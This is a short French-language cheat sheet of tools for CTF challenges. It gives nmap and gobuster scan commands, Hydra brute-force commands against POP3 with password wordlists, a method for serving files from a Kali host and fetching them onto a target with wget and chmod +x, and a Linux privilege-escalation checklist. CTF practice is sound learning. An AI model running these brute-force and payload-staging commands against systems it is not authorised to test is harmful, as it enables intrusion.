---
description: Outils utilisés dans la résolution des challenges.
---

# Outils

## nmap

```shell-session
nmap $IP -A -p- -oN nmap.txt -T4
```

## gobuster

```shell-session
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ".php,.html,.txt" -u $IP -t50
```

## Hydra

```
hydra -l <user>  -P /usr/share/wordlists/rockyou.txt pop3://$IP -s <port> -t 64
```

```
hydra -l <user>  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s <port> -t 64 
```

## Transfert de fichiers

Pour transférer des fichiers depuis la machine Kali vers la machine cible:

1. sur la machine Kali
   1. aller dans le répertoire contenant les fichiers à transférer
   2. `python3 -m http.server`
2. sur la machine cible
   1. aller dans le répertoire /dev/shm
   2. `wget < kali tun0 IP>:8000/fichier.à.transférer`
   3. rendre les fichiers exécutables avec `chmod +x`

## Privilege Escalation

Voici la méthode générique que j'utilise pour trouver les possibilités de 'privilege escalation'. Cette méthode est en partie basée sur l'article Linux [Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/).

1. sudo -l
2. [suid3num.py](https://github.com/Anon-Exploiter/SUID3NUM/tree/master)
3. [les.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)
4. [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
